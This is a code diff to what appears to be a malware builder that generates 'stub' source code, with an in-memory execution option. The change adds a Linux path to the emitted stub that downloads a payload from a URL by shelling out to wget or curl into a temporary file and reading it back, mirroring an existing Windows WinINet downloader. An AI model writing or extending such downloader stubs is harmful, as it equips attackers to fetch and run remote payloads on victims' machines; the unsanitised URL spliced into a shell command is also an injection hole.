@@ -300,7 +300,11 @@ public:
             stub << "#include <wininet.h>\n";
             stub << "#pragma comment(lib, \"wininet.lib\")\n";
             stub << "#else\n";
-            stub << "#include <curl/curl.h>\n";
+            stub << "#include <cstdlib>\n";
+            stub << "#include <cstdio>\n";
+            stub << "#include <memory>\n";
+            stub << "#include <array>\n";
+            stub << "#include <unistd.h>\n";
             stub << "#endif\n";
         }
         if (config.inMemoryExecution) {
@@ -363,7 +367,33 @@ public:
             stub << "    InternetCloseHandle(hUrl);\n";
             stub << "    InternetCloseHandle(hInternet);\n";
             stub << "#else\n";
-            stub << "    // Linux implementation would use curl\n";
+            stub << "    // Linux implementation using system commands\n";
+            stub << "    char tempFile[] = \"/tmp/dlXXXXXX\";\n";
+            stub << "    int fd = mkstemp(tempFile);\n";
+            stub << "    if (fd == -1) return data;\n";
+            stub << "    close(fd);\n";
+            stub << "    \n";
+            stub << "    // Try wget first, then curl\n";
+            stub << "    std::string cmd = std::string(\"wget -q -O \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
+            stub << "    if (system(cmd.c_str()) != 0) {\n";
+            stub << "        cmd = std::string(\"curl -s -o \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
+            stub << "        if (system(cmd.c_str()) != 0) {\n";
+            stub << "            unlink(tempFile);\n";
+            stub << "            return data;\n";
+            stub << "        }\n";
+            stub << "    }\n";
+            stub << "    \n";
+            stub << "    // Read downloaded file\n";
+            stub << "    std::ifstream file(tempFile, std::ios::binary);\n";
+            stub << "    if (file) {\n";
+            stub << "        file.seekg(0, std::ios::end);\n";
+            stub << "        size_t size = file.tellg();\n";
+            stub << "        file.seekg(0, std::ios::beg);\n";
+            stub << "        data.resize(size);\n";
+            stub << "        file.read(reinterpret_cast<char*>(data.data()), size);\n";
+            stub << "        file.close();\n";
+            stub << "    }\n";
+            stub << "    unlink(tempFile);\n";
             stub << "#endif\n";
             stub << "    return data;\n";
             stub << "}\n\n";
